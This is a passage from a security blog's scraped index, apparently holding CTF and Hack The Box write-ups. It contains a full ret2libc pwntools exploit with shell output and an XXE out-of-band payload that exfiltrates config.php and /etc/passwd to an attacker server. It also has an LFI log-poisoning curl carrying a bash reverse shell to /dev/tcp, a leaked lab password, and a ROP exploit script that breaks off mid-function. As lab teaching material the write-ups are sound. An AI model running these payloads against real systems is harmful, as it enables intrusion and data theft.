exploit I got the address leak of puts. Output:- ❯ python3 part1_exploit.py [+] Opening connection to cha.hackpack.club on port 41702: Done [*] '/home/gr4n173/climb' Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) [*] Loaded 16 cached gadgets for './climb' [*] puts@plt: 0x40050c [*] __libc_start_main: 0x601018 [*] pop rdi gadget: 0x400743 [*] Switching to interactive mode [*] Leaked libc address, Puts: 0x7f6662f2b9c0 [*] Switching to interactive mode [*] Got EOF while reading in interactive Hm… Cool,right? By overflowing the buffer, poping the argument, pointing to got and plt of puts address I finally leaked address of puts from libc. ","date":"2020-07-11","objectID":"/ret2libc/:2:5","tags":["linux","ctf","hackpackctf","pwn","BoF","ret2libc","Explotation\u0026Pwning"],"title":"Pwn Ret2Libc","uri":"/ret2libc/"},{"categories":["ctf"],"content":"Finding version of libc And another thing was, every time when exploit was run,I got the different address except the last 3 bytes of the puts leaked address remains same. So that helped me to find a version of libc. In order to find the libc verion you can use this website Find libc version here. By using this, libc verison was shown and file was downloaded. From above, libc version was libc6_2.27-3ubuntu1_amd64 and got a shell after buffer was overflowed. One thing to remember about the address of the function like system, puts, printf etc.,inside the libc is, it just shift the address a bit from the libc base address. So by subracting puts leak address with actual address of puts from libc I got the base address of the libc. ","date":"2020-07-11","objectID":"/ret2libc/:2:6","tags":["linux","ctf","hackpackctf","pwn","BoF","ret2libc","Explotation\u0026Pwning"],"title":"Pwn Ret2Libc","uri":"/ret2libc/"},{"categories":["ctf"],"content":"Getting base address of libc libc.address = leak - libc.sym[\"puts\"] log.info(\"Base address of libc: %s \" % hex(libc.address)) Output: - ❯ python3 part1_exploit.py [+] Opening connection to cha.hackpack.club on port 41702: Done [*] '/home/gr4n173/climb' Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) [*] '/home/gr4n173/libc6_2.27-3ubuntu1_amd64.so' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled [*] Loaded 16 cached gadgets for './climb' [*] puts@plt: 0x40050c [*] __libc_start_main: 0x601018 [*] pop rdi gadget: 0x400743 [*] rdi: 0x4004fe [*] Leaked libc address, Puts: 0x7f03f04ea9c0 [*] Base address of libc: 0x7f03f046a000 Now with this libc version I found a system and bin/sh address to get a shell. You can use one_gadget directly to get a shell but I mostly use system more to get know knowledge about the address of system and binsh. ","date":"2020-07-11","objectID":"/ret2libc/:2:7","tags":["linux","ctf","hackpackctf","pwn","BoF","ret2libc","Explotation\u0026Pwning"],"title":"Pwn Ret2Libc","uri":"/ret2libc/"},{"categories":["ctf"],"content":"Address of bin/sh and system BINSH = next(libc.search(\"/bin/sh\")) #Verify with find /bin/sh libc6_2.27-3ubuntu1_amd64.so SYSTEM = libc.sym[\"system\"] log.info(\"bin/sh: %s \" % hex(BINSH)) log.info(\"system: %s \" % hex(SYSTEM)) One thing to notice before this; we have to return to main so that we can overflow the function and get a shell. Hence my part2_exploit was received = p.recvline().strip() leak = u64(received.ljust(8,b\"\\x00\")) log.info(\"Leaked libc address, Puts: %s\" % hex(leak)) libc.address = leak - libc.sym[\"puts\"] log.info(\"Base address of libc: %s \" % hex(libc.address)) BINSH = next(libc.search(\"/bin/sh\")) SYSTEM = libc.sym[\"system\"] log.info(\"bin/sh: %s \" % hex(BINSH)) log.info(\"system: %s \" % hex(SYSTEM)) payload2 = OFFSET payload2 += p64(RET) payload2 += p64(POP_RDI) payload2 += p64(BINSH) payload2 += p64(SYSTEM) p.recvuntil(\"How will you respond? \")) p.sendline(payload2) In payload2, I used RET to make stack 16 bytes aligned by popping off 8 bytes off top of stack and returning to it. ","date":"2020-07-11","objectID":"/ret2libc/:2:8","tags":["linux","ctf","hackpackctf","pwn","BoF","ret2libc","Explotation\u0026Pwning"],"title":"Pwn Ret2Libc","uri":"/ret2libc/"},{"categories":["ctf"],"content":"Pwning a shell So combining the part1 and part2 exploit my final exploit becomes #!/bin/python # (combined)exploit.py from pwn import * # Import pwntools p= remote('cha.hackpack.club',41702) #p = process(\"./climb\") elf = ELF(\"./climb\") libc = ELF(\"libc6_2.27-3ubuntu1_amd64.so\") rop = ROP(elf)# Find ROP gadgets PUTS_PLT = elf.plt['puts'] MAIN = elf.symbols['main'] PUTS_GOT = elf.got['puts'] POP_RDI = (rop.find_gadget(['pop rdi', 'ret']))[0]# Same as ROPgadget --binary vuln | grep \"pop rdi\" RET = (rop.find_gadget(['ret']))[0] log.info(\"Puts@plt: \" + hex(PUTS_PLT)) log.info(\"Puts@glt : \" + hex(PUTS_GOT)) log.info(\"Pop rdi gadget: \" + hex(POP_RDI)) log.info(\"rdi: \" + hex(RET)) #Overflow buffer until return address OFFSET = (\"A\"*40).encode() #+ \"B\"*8 # Create rop chain payload1 = OFFSET payload1 += p64(POP_RDI) payload1 += p64(PUTS_GOT) payload1 += p64(PUTS_PLT) payload1 += p64(MAIN) #Send our rop-chain payload p.recvuntil(\"How will you respond? \") p.sendline(payload1) #Parse leaked address recieved = p.recvline().strip() leak = u64(recieved.ljust(8,b\"\\x00\")) log.info(\"Leaked libc address, Puts: %s\" % hex(leak)) libc.address = leak - libc.sym[\"puts\"] log.info(\"Base address of libc: %s\" % hex(libc.address)) BINSH = next(libc.search(\"/bin/sh\")) SYSTEM = libc.sym[\"system\"] log.info(\"bin/sh: %s\" % hex(BINSH)) log.info(\"system: %s\" % hex(SYSTEM)) payload2 = OFFSET payload2 += p64(RET) payload2 += p64(POP_RDI) payload2 += p64(BINSH) payload2 += p64(SYSTEM) p.recvuntil(\"How will you respond? \")) p.sendline(payload2) p.interactive() Output: - ❯ python exploit.py [+] Opening connection to cha.hackpack.club on port 41702: Done [*] '/home/gr4n173/climb' Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) [*] '/home/gr4n173/libc6_2.27-3ubuntu1_amd64.so' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled [*] Loaded 16 cached gadgets for './climb' [*] Puts@plt: 0x40050c [*] Puts@glt : 0x601018 [*] Pop rdi gadget: 0x400743 [*] rdi: 0x4004fe [*] Leaked libc address, Puts: 0x7ff0e807a9c0 [*] Base address of libc: 0x7ff0e7ffa000 [*] bin/sh: 0x7ff0e81ade9a [*] system: 0x7ff0e8049440 [*] Switching to interactive mode $ ls climb flag.txt $ cat flag.txt flag{w0w_A_R34L_LiF3_R0pp3r!} $ ","date":"2020-07-11","objectID":"/ret2libc/:2:9","tags":["linux","ctf","hackpackctf","pwn","BoF","ret2libc","Explotation\u0026Pwning"],"title":"Pwn Ret2Libc","uri":"/ret2libc/"},{"categories":["ctf"],"content":"Conclusion In this part of Exploitation\u0026Pwning Series here I tried to explain about the ret2libc exploit. At first I overflowed the buffer and called to got address to leak the address of related function. Later I returned back to main so that I can use the overflow function again and get a shell by using system and binsh from libc. Stay updated to my blog. I will be posting next writeup soon about Exploitation\u0026Pwning series posts. Last but not the least I would like to thank all my readers for staying with me till here. Feedbacks are really appreciated in the comments below. Stay safe. Keep learning. ","date":"2020-07-11","objectID":"/ret2libc/:3:0","tags":["linux","ctf","hackpackctf","pwn","BoF","ret2libc","Explotation\u0026Pwning"],"title":"Pwn Ret2Libc","uri":"/ret2libc/"},{"categories":["hackthebox"],"content":"Here I will explain my path for Patents box from Hack The Box.","date":"2020-05-16","objectID":"/patents/","tags":["linux","htb","lfmserver","ROP","XXE","LFI-posioning","git"],"title":"Patents","uri":"/patents/"},{"categories":["hackthebox"],"content":"Patents was a hard Hard box. It falls under linux and hard category. Especially to get the root was the tough one where I had to build my own script to exploit the ROP in the server. HTB:Patents Patents was a hard Hard box. It falls under linux and hard category. Especially to get the root was the tough one where I had to build my own script to exploit the ROP in the server. And I will be describing detail about the ROP in next post stay tuned. I’ll approach this write-up how I solved it, along with the problems that I had to face during this box. At first I obtained the user flag by exploiting XXE and got LFI vulnerability api where I poised it and got a user shell. For root, I recovered the deleted files of git and exploited the ROP in elf file of lfmserver then mount to get a root flag. ","date":"2020-05-16","objectID":"/patents/:0:0","tags":["linux","htb","lfmserver","ROP","XXE","LFI-posioning","git"],"title":"Patents","uri":"/patents/"},{"categories":["hackthebox"],"content":"Box Details In above picture IP was 10.10.10.173 and added it to /etc/hosts/ as patents.htb. Let’s solve this box. ","date":"2020-05-16","objectID":"/patents/:1:0","tags":["linux","htb","lfmserver","ROP","XXE","LFI-posioning","git"],"title":"Patents","uri":"/patents/"},{"categories":["hackthebox"],"content":"Recon Let’s start with our universal port scanner, nmap to see the open ports and ports SSH(22), HTTP(80) and lfm(8888) are opened. # Nmap 7.80 scan initiated Tue Apr 7 12:47:04 2020 as: nmap -sS -sV -sC -Pn -oA nmap --min-rate 1000 10.10.10.173 Nmap scan report for patents.htb (10.10.10.173) Host is up (0.25s latency). Not shown: 997 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.7p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 39:b6:84:a7:a7:f3:c2:4f:38:db:fc:2a:dd:26:4e:67 (RSA) | 256 b1💿18:c7:1d:df:57:c1:d2:61:31:89:9e:11:f5:65 (ECDSA) |_ 256 73:37:88:6a:2e:b8:01:4e:65:f7:f8:5e:47:f6:10:c4 (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: MEOW Inc. - Patents Management 8888/tcp open sun-answerbook? | fingerprint-strings: | Help, LPDString, LSCP: |_ LFM 400 BAD REQUEST 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port8888-TCP:V=7.80%I=7%D=4/7%Time=5E8C257D%P=x86_64-pc-linux-gnu%r(LSC SF:P,17,\"LFM\\x20400\\x20BAD\\x20REQUEST\\r\\n\\r\\n\")%r(Help,17,\"LFM\\x20400\\x20B SF:AD\\x20REQUEST\\r\\n\\r\\n\")%r(LPDString,17,\"LFM\\x20400\\x20BAD\\x20REQUEST\\r\\ SF:n\\r\\n\"); Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Tue Apr 7 12:48:57 2020 -- 1 IP address (1 host up) scanned in 112.74 seconds ","date":"2020-05-16","objectID":"/patents/:2:0","tags":["linux","htb","lfmserver","ROP","XXE","LFI-posioning","git"],"title":"Patents","uri":"/patents/"},{"categories":["hackthebox"],"content":"Web Enumeration As soon as I saw port 80 opened I visited and got the output. So seems like the website was related to the patent management account of the admin user Ajeje Brazorf and found the upload as the interesting dir where I can upload the files in docx format. Besides that I searched for the more directory with dirsearch my usual tool but nothing was found there. then I used dirsearch with raft-large-directories.txt as wordlist then I got this as output. root@gr4n173:~$ gobuster dir -u http://patents.htb/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-directories.txt -t 130 =============================================================== Gobuster v3.0.1 by OJ Reeves (@TheColonial) \u0026 Christian Mehlmauer (@_FireFart_) =============================================================== [+] Url: http://patents.htb/ [+] Threads: 130 [+] Wordlist: /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-directories.txt [+] Status codes: 200,204,301,302,307,401,403 [+] User Agent: gobuster/3.0.1 [+] Timeout: 10s =============================================================== 2020/05/16 13:01:36 Starting gobuster =============================================================== /upload (Status: 200) /uploads (Status: 301) /profile (Status: 200) /index (Status: 200) /patents (Status: 301) /static (Status: 301) /vendor (Status: 301) /output (Status: 301) /release (Status: 301) And then I used same in directory inside every 301 responses but nothing found and at last I used the raft-large-words.txt directory which took a long time but valid directory was found. /releases/UpdateDetails. Then I visited and got this as output. This website gave me the full description about the Docx2Pdf upload feature and it’s vulnerability especially Directory traversal Local file inclusion (parameter) which was eye catching one. ","date":"2020-05-16","objectID":"/patents/:2:1","tags":["linux","htb","lfmserver","ROP","XXE","LFI-posioning","git"],"title":"Patents","uri":"/patents/"},{"categories":["hackthebox"],"content":"File upload to XXE As upload feature was doc2pdf so first thing that comes in my mind after seeing the .doc format was only about the XXE vulnerability. I first tried by uploading the normal .docx file and I found a pdf file of that docx file to check if that upload function is working or not. Then I used Exploiting XXE using Out-Of-Band(OOB) technique. Let me explain with the steps that I used to create the payload, at first I created a payload in defaultXml files and uploaded but unable to exploit so I used the customXml file to create my payload and that way worked. To learn more about XXE visit Portswigger. Unzipped the .docx Creating the payload Zipped the same file ","date":"2020-05-16","objectID":"/patents/:2:2","tags":["linux","htb","lfmserver","ROP","XXE","LFI-posioning","git"],"title":"Patents","uri":"/patents/"},{"categories":["hackthebox"],"content":"Unzip .docx file At first I unzipped the file with command and got the following dir as root@gr4n173~$ unzip -u file.docx inflating: word/numbering.xml inflating: word/_rels/fontTable.xml.rels inflating: _rels/.rels inflating: [Content_Types].xml inflating: DS_Store inflating: docProps/app.xml inflating: docProps/core.xml inflating: dtd.xml ","date":"2020-05-16","objectID":"/patents/:2:3","tags":["linux","htb","lfmserver","ROP","XXE","LFI-posioning","git"],"title":"Patents","uri":"/patents/"},{"categories":["hackthebox"],"content":"Creating the payload I created the payload in customXml folder where I used the paramter entity(%) as regular entity(\u0026) didn’t worked at first. /customXml/item1.xml \u003c?xml version=\"1.0\" ?\u003e \u003c!DOCTYPE r [ \u003c!ELEMENT r ANY \u003e \u003c!ENTITY % sys SYSTEM \"http://10.10.14.32:8000/dtd.xml\"\u003e %sys; %res; ]\u003e \u003cr\u003e\u0026exfil;\u003c/r\u003e Then I edited the dtd.xml files with php wrapper inside it to read the config.php file as that Web was vulnerable to LFI. dtd.xml \u003c!ENTITY % data SYSTEM \"php://filter/convert.base64-encode/resource=config.php\"\u003e \u003c!ENTITY % res \"\u003c!ENTITY exfil SYSTEM 'http://10.10.14.32:8000/dtd.xml?%data;'\u003e\"\u003e ","date":"2020-05-16","objectID":"/patents/:2:4","tags":["linux","htb","lfmserver","ROP","XXE","LFI-posioning","git"],"title":"Patents","uri":"/patents/"},{"categories":["hackthebox"],"content":"Zipped the file At last I zipped the file with my payload inside it root@gr4n173:~$ zip -u TES-4.docx customXml/item1.xml After zipped the .docx file I uploaded the file with python server on in dir of dtd.xml file then I got the response in python server in base64 encoded format. Python3 Server on root@gr4n173:~$ python3 -m http.server Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ... 10.10.10.173 - - [16/May/2020 14:02:25] \"GET /dtd.xml HTTP/1.0\" 200 - 10.10.10.173 - - [16/May/2020 14:02:26] \"GET /dtd.xml?PD9waHAKIyBuZWVkZWQgYnkgY29udmVydC5waHAKJHVwbG9hZGlyID0gJ2xldHNnby8nOwoKIyBuZWVkZWQgYnkgZ2V0UGF0ZW50LnBocAojIGdieW9sbzogSSBtb3ZlZCBnZXRQYXRlbnQucGhwIHRvIGdldFBhdGVudF9hbHBoYXYxLjAucGhwIGJlY2F1c2UgaXQncyB2dWxuZXJhYmxlCmRlZmluZSgnUEFURU5UU19ESVInLCAnL3BhdGVudHMvJyk7Cj8+Cgo= HTTP/1.0\" 200 - As we used the php wrapper inside the file dtd.xml to read a config.php file so we got the configuration after decoding. root@gr4n173~$ echo \"PD9waHAKIyBuZWVkZWQgYnkgY29udmVydC5waHAKJHVwbG9hZGlyID0gJ2xldHNnby8nOwoKIyBuZWVkZWQgYnkgZ2V0UGF0ZW50LnBocAojIGdieW9sbzogSSBtb3ZlZCBnZXRQYXRlbnQucGhwIHRvIGdldFBhdGVudF9hbHBoYXYxLjAucGhwIGJlY2F1c2UgaXQncyB2dWxuZXJhYmxlCmRlZmluZSgnUEFURU5UU19ESVInLCAnL3BhdGVudHMvJyk7Cj8+Cgo=\" | base64 -d \u003c?php # needed by convert.php $uploadir = 'letsgo/'; # needed by getPatent.php # gbyolo: I moved getPatent.php to getPatent_alphav1.0.php because it's vulnerable define('PATENTS_DIR', '/patents/'); ?\u003e Here I found the dir getPatent_alphav1.0.php inside the dir /patents/. This indicated exploit for XXE vulnerability was succeed so I tried reading the /etc/passwd file for that I just changed the file dtd.xml as root@gr4n173:~$ python3 -m http.server Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ... 10.10.10.173 - - [16/May/2020 14:11:57] \"GET /dtd.xml HTTP/1.0\" 200 - 10.10.10.173 - - [16/May/2020 14:11:58] \"GET /dtd.xml?cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgpiYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91c3Ivc2Jpbi9ub2xvZ2luCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L3Vzci9zYmluL25vbG9naW4KaXJjOng6Mzk6Mzk6aXJjZDovdmFyL3J1bi9pcmNkOi91c3Ivc2Jpbi9ub2xvZ2luCmduYXRzOng6NDE6NDE6R25hdHMgQnVnLVJlcG9ydGluZyBTeXN0ZW0gKGFkbWluKTovdmFyL2xpYi9nbmF0czovdXNyL3NiaW4vbm9sb2dpbgpub2JvZHk6eDo2NTUzNDo2NTUzNDpub2JvZHk6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCl9hcHQ6eDoxMDA6NjU1MzQ6Oi9ub25leGlzdGVudDovdXNyL3NiaW4vbm9sb2dpbgpnYnlvbG86eDoxMDAwOjEwMDA6Oi9ob21lL2dieW9sbzovYmluL2Jhc2gK HTTP/1.0\" 200 - decoded that base64 text and got the /etc/passwd data.https://medium.com/@noobintheshell/htb-patents-88bfdbde4c5a root@gr4n173:~$ echo \"cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zY","date":"2020-05-16","objectID":"/patents/:2:5","tags":["linux","htb","lfmserver","ROP","XXE","LFI-posioning","git"],"title":"Patents","uri":"/patents/"},{"categories":["hackthebox"],"content":"LFI to www-data As I got /getPatent_alphav1.0.php dir I checked that dir and got this as output. This indicated that, there was ?id parameter which saved my time to find a parameter for LFI vulnerability. Now I used that parameter and able to see the patents items of admin user. But I tried the every possible way to find the LFI and at last I got the clue. As I enter 1 as value in parameter I can see the details of the patents item. Likewise I tried with ../1 which was basic dir to find the LFI and got the same patents item output. This indicated that using ../ doesn’t make sense so I had to try that again i.e. ....// as there there 5 patents items. I used that 5 times to see if I can access the /etc/passwd file as ?id=....//....//....//....//....//etc/passwd . Nice this way I got the LFI vulnerability and now I had to poison it to get the RCE. Then I tried looking for /var/log/apache.log file to see if I can access that file so that I can poison it but that didn’t worked. So we have to use /proc/self/fd/{number} dir where we can access the log file if incase we was unable to access apache.log file. Now to find the number I used the burpsuite to bruteforce and found the number=2 which gave 200 response. This way I can access the log file so I tried poisoning it for that I used with listner on. root@gr4n173:~$ curl --referer \"\u003c?php exec(\\\"/bin/bash -c 'bash -i \u003e /dev/tcp/10.10.14.32/1337 0\u003e\u00261'\\\"); ?\u003e\" \"http://patents.htb/getPatent_alphav1.0.php/?id=....//....//....//....//....//....//....//proc//self//fd//2\" Listner On: root@gr4n173:~$ nc -lvnp 1337 listening on [any] 1337 ... connect to [10.10.14.187] from (UNKNOWN) [10.10.10.173] 57008 whoami www-data python -c \"import pty;pty.spawn('/bin/bash')\" www-data@d9cf3b2a6944:/var/www/html/docx2pdf$ This way I got the www-data shell. You can learn more about LFI Poisoning here. ","date":"2020-05-16","objectID":"/patents/:3:0","tags":["linux","htb","lfmserver","ROP","XXE","LFI-posioning","git"],"title":"Patents","uri":"/patents/"},{"categories":["hackthebox"],"content":"Www-data to User As I got the www-data shell first thing I will try is using linEnum.sh and pspy64 to see the files and command that was used . Then from the pspy64 output I got the creds of user gbyolo user and I was able to login into the shell. www-data@d9cf3b2a6944:/tmp/$./pspy64 ..... ...... /bin/sh -c env PASSWORD=\"!gby0l0r0ck$$!\" /opt/checker_client/run_file.sh 2 python checker.py 10.100.0.1:8888 lfmserver_user PASSWORD /var/www/html/docx2pdf/convert.php This way I got the root container and user.txt flag. www-data@d9cf3b2a6944:/tmp/$ su -i gbyolo Password:!gby0l0r0ck$$! root@2ca604911b14:# whoami gbyolo root@2ca604911b14:#cat user.txt 0afdf89*************** This way I got the user shell and flag. ","date":"2020-05-16","objectID":"/patents/:4:0","tags":["linux","htb","lfmserver","ROP","XXE","LFI-posioning","git"],"title":"Patents","uri":"/patents/"},{"categories":["hackthebox"],"content":"Root As soon as I got the root container I checked every part of the shell and got the dir /opt/checker_client and /opt/checker_runned besides these dir I found initialization folder of .git inside /usr/src/ directory. So I check git log. To learn more about git commands visit here. root@2ca604911b14:/usr/src/lfm# git log --diff-filter=D --summary | grep delete \u003cit# git log --diff-filter=D --summary | grep delete delete mode 100644 README delete mode 100755 lfmserver delete mode 100644 Makefile delete mode 100644 README delete mode 100644 arg_parsing.c delete mode 100644 arg_parsing.h delete mode 100644 file.c delete mode 100644 file.h delete mode 100644 files/try delete mode 100644 lfm.c delete mode 100644 lfm.h delete mode 100644 lfmserver.c delete mode 100644 lfmserver.conf delete mode 100644 lfmserver.h delete mode 100644 log.c delete mode 100644 log.h delete mode 100644 md5.c delete mode 100644 md5.h delete mode 100644 params_parsing.c delete mode 100644 params_parsing.h delete mode 100644 process.c delete mode 100644 process.h delete mode 100644 socket_io.c delete mode 100644 socket_io.h delete mode 100644 thread.c delete mode 100644 thread.h From here I got the deleted files so I recovered this files by compressing the file as tar and encoding to base64 and then copied to the localhost. root@2ca604911b14:/usr/src/lfm# tar cvzf repo.tar .git/ root@2ca604911b14:/usr/src/lfm# cat repo.tar | base64 \u003e file.txt root@2ca604911b14:/usr/src/lfm# cat file.txt ....... 3e5pu4M7B8iXxe5hZp/FqFHl973bqVECSElvwoXYIEpvMTZJvFR+wXmRQPgdFdRuoawIGPFyew0q eHGKtyGMKDQO91X/PasyFRcOmWmc3TJUphICs7r3hV5z4eRSuPnFIqZgHIdNNqWsiPODY9D0jAny 5ziiSaD8ame1eJa+zzIQf0zI3/l8dTLZTnGt1PY8AlklSAABtBhBqBPMstaTqjsVmQbgIzvLQCJc 9PJAPfpelLw//o6gfNlk+8CN89rTxIF3UWUSLrVJWyMUGy+YYtSwk5s7z4LUk/xGCOWRwlHOGm1S 23CSyXpZ0Ac/ZrEYn39XUsiNr1Yb4j4ixf0ZxqdOmTOongdRigUVkvNhqErO+y4XUHTItc8Ayy1h 4vNDrdtPc8/wmN7qjP3H2a/3m8IULlbqeUl5jqRcFI1zPpfeovyujqYArsvlwIbbE4lSvWy7XLos Tx4t6rkWHlZEBL+dJBHqmBiB1UeRKBjIDyU0otgfJ/3kTZomg8o/CTlqa5ZSxamtOBJQU9m3zXUk XgiPOSYjmioQd+/VPFhFh0L0VQW21+v/GXfIqW0iF+722OFR/250oxdgbcrlSN/iIVMv4OsyHQvx 7UBV2lLRzgVbJhNJjCwoHvxndzmC7xQjUU9WcdPslgZOLY0R/q1kFbJoFAukLnb5oAPThVcjfK0I 7+5vKN0qnPgPPlqkXOm9aUU8PNXyyt50MRcx1L2fHlyy05wtQ6sNHceDgZONEC1Mzv5K+JuPqfRU NVUFiGAKwrEV1bDEuHFruZtlC0BCjQGODBHkkoLEqHBiYFmzMhNiR87KjKgKyyTGQfa4NWEhqZEr AKouLI6jP574Sr6sBcqiefIK71KiUhjViITLKgbeQcr5phwcdOdO1WXvaEatT7nN5LTB291JcEqa +Ai4syiq5qy/5LPHJNHOnqbos/PFmMqQuYkInOQOSPGUGamMULEoJYu/SSVeCHtIMsErlkqakE7s bTMHvA6N3Ap70kIdeEfxq4qtatbOExMVUiNR1VQS7ZWUyVVJ6xLue7DzP8FeZhVFY9L2ZK3yHhh0 zvclB91oujSAkAuKNRRg100pfEVWpOW3twXoZOUOKq1PBnAeZAHyg6K3kiA8Gto9PAhHGg8V7bE3 L7udZ9yBbapp2+lmyFLSXAEqqf07i4j44UVe9FTBrX0d7l2zp/u84VrEKMrPMrQleJqTMnj5h5CS pBIXa59tPtW4Lb1vCFYopSSRPDt5xWX5UPH7FLG70AHvp/6lCGBzh8i+v35Vlt6rhxQ4vipE96Sx QVLXUA/bd4ApFuaxO6nWQo7ry8vZ+HEez2l6+Nkkh4n0odaeIZklwkjlHI7OuQegzPJo+Ztc2Msy 9VnAGJwiQxlwKDDCBtCmHYrMmxsbKvKpfYemRyRAdiAVdpm2ZfO26a3NVKERqieAyy47VaIvFYHs bYlvwJPtGj0jhrqzaOuRHePM2K2gZBBQtQl7Z8XuA+NXkOzPRO6XuyiJ52nkQXC6lcZhKp+dPvjX oFsJ+h7ntgzxrHnvoSUQsNgpR3Ly2/6xsxtFEIHSMSQfnc3fBjiifKaFAe/5o8xie1bk1I0tRBl6 3wZnZmbM/3hLLSSFWon4LtxCjCQifSRTPbcJYEJSKyP7TjMMpShDuCxpYHx7WZd6ie9hWq//dics mO1xCGk5n1FUDOPhInUYFwmaLrwlbO/hY0MmNagvyv+i7Y8aQkdyvZLpiR/hIfno9yD8NtyAPtQE ovfVo0E17rlaGuN+qViawHbDtq11brizG7sn/FnvJZWbqTyawzeq1YUTqcf8mS2DuPdU+k7Ckfwu OcWPVlhzg1C0qNfNv0DwNvvV0eyWJr+BUDllxZH8/mDz8eClBk7tB00VChsLuSzH5Udn9LMFLE7D 5eXV5/vqcL50dyq18qgPZFYXMvu9XOlkzdaap2Pcfos8o+UHa06IepDcVdppg293RbAuVF9jil8R wJi7qlso0spe2D1Lrxtyseg2lUpMp2uy5syv/g+/5s3J06BUHZlQt7r0S2xv9/27G4g4n+jjwdiF okLgDvJyd2GFx2Acw91Xs1q3HW1koxWO+VO5w2vx8uCUvfgtwWEDUSWkwRv7zWk97eDsaQW7Jg53 WVe2dXZ+5zHvfRXw6GVnwrS2V47XgGTDn+WLyW7q++G73gYx6hBIq1E8N+bHRdvtG1vdqXi7laKm /0OpITBaRWVj0Bex0ufneM5kzRx2FxibI9qX56nNZwTj3bAeo27OXyZUQv/kFJzWfEinVqx9gu6T vZ28v/J20zUGlLz09KVO1uwM92S8XDwBq0sB6ljezryxfbNT9PiXKNslD/0UQN6WbLZGM2uAJFIW t6qeIjNJfVR/vNiGN/khbsfc09cy3hbH/vEzxM52P2Ey+PFNZkr5xUkFstghJLvx1PPsWfBD+GwS a0GeyOW7tuyyHwu9TvUQfK+s3UuOj4SjcZGJhHTEJyhQUDH","date":"2020-05-16","objectID":"/patents/:5:0","tags":["linux","htb","lfmserver","ROP","XXE","LFI-posioning","git"],"title":"Patents","uri":"/patents/"},{"categories":["hackthebox"],"content":"ROP to Root Now to get the root, I made a simple exploit to pwn the shell by using ROP. Here I will go through the exploit but detail about the ROP with aslr enabled will be explained in my next post of Exploitation\u0026Pwning part 2 Series. #exploit.py #!/usr/bin/env python from pwn import * host = 'patents.htb' port = 8888 fd = 6 bin = ELF('./lfmserver') libc = ELF('libc.so.6') time = 0.1 hash = \"26ab0db90d72e28ad0ba1e22ee510510\" user = \"lfmserver_user\" password = \"!gby0l0r0ck$$!\" def gen(): return remote(host, port) def encode(string): return \"\".join(\"%{0:0\u003e2}\".format(format(ord(char), \"x\")) for char in string) def genRequest(payload): request = 